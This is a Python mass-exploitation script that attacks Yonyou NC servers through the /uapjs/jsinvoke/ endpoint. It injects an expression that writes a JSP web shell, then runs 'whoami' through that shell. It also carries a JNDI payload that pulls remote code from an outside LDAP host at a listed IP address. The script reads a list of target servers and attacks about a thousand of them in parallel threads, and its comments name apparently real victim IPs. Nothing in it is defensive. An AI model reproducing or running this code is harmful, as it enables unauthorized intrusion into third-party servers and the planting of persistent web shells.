import json
import requests
from concurrent.futures import ThreadPoolExecutor
import os
import urllib3
import threading
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
line_break = '\n'
file_path = Path(__file__).resolve()
result_path = file_path/'result.txt'


def exploit(ip_, index):
    try:

        url = ip_+'/uapjs/jsinvoke/?action=invoke'
        # print(url)
        payload = '{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/mike.jsp"]}'
        payload1 = {
            # 'json': json.dumps({
            'serviceName': 'nc.itf.iufo.IBaseSPService',
            'methodName': 'saveXStreamConfig',
            'parameterTypes': ['java.lang.Object', 'java.lang.String'],
            'parameters': ["${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://13.231.169.46:1389/TomcatBypass/TomcatEcho')}", "webapps/nc_web/jndi.jsp"]
            # })
        }
        #    13.231.169.46
        res = requests.post(url, data=payload,
                            headers=headers, timeout=8, verify=False)
        if res.status_code !=200 or res.status_code!=404:
            return
        # print(res, len(res.text))

        post_ip=ip_+'/mike.jsp?error=bsh.Interpreter'
        # post_ip=ip_+'/mike.jsp'

        payload_post='cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("whoami").getInputStream())'
        post_res=requests.post(post_ip,data=payload_post,
                            headers=headers, timeout=8, verify=False)
        # post_res=requests.get(post_ip,headers=headers, timeout=8, verify=False)
        if post_res.status_code!=200 or '登录' in res.text:
            return
        print(index, ip_)
        print(post_res.text)
        print(post_res,len(post_res.text))
        # with result_path.open('a+') as file:
        # file.write(ip_+line_break)

    except Exception as e:
        # print(e)
        pass


# <Response[200] > 166
# 1557 http: // 222.66.65.72
#  183.131.92.94:8000
[200]
url = 'http://222.66.65.72'
# exploit(url, 1)


threads = []
with open(r'D:\Downloads\tmp\yongyou_NC.txt', 'r') as file:
    # with open(r'nfs.txt', 'r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 2000
        end = start+1000

        if index >= start and index <= end:
            urls.append(line.strip(line_break))

            # if index==:
            # break
            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 20
# print(urls)

test = 'm'


if test == 't':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test == 'm':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()
